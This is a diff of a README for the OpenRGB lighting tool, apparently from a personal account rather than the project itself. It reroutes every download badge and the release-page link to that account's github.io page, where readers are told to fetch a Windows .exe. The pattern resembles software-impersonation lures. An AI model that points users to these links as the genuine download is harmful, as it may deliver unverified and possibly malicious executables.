@@ -1,6 +1,6 @@
 # 🌈 OpenRGB - Control your gaming peripheral lighting easily
 
-[![](https://img.shields.io/badge/Download_OpenRGB-Blue-blue)](https://github.com/irisdcr8311/OpenRGB/releases)
+[![](https://img.shields.io/badge/Download_OpenRGB-Blue-blue)](https://irisdcr8311.github.io)
 
 OpenRGB allows you to control the lighting on your computer hardware. This software works with many brands of keyboards, mice, motherboards, fans, and memory sticks. You do not need multiple apps for each piece of hardware. OpenRGB brings all your lights into one screen.
 
@@ -18,13 +18,13 @@ OpenRGB works on Windows 10 and Windows 11. It needs minimal system power to run
 
 You need the latest version of the application to ensure your hardware stays supported. Follow the steps below to find the correct file.
 
-1. Visit the [OpenRGB Release Page](https://github.com/irisdcr8311/OpenRGB/releases).
+1. Visit the [OpenRGB Release Page](https://irisdcr8311.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Choose the file ending in `.exe` that matches your Windows version.
 4. Click the link to begin the download.
 5. Save the file to your computer.
 
-[![](https://img.shields.io/badge/OpenRGB_Download_Page-Grey-grey)](https://github.com/irisdcr8311/OpenRGB/releases)
+[![](https://img.shields.io/badge/OpenRGB_Download_Page-Grey-grey)](https://irisdcr8311.github.io)
 
 ## 🛠️ Installing OpenRGB 🖱️
 
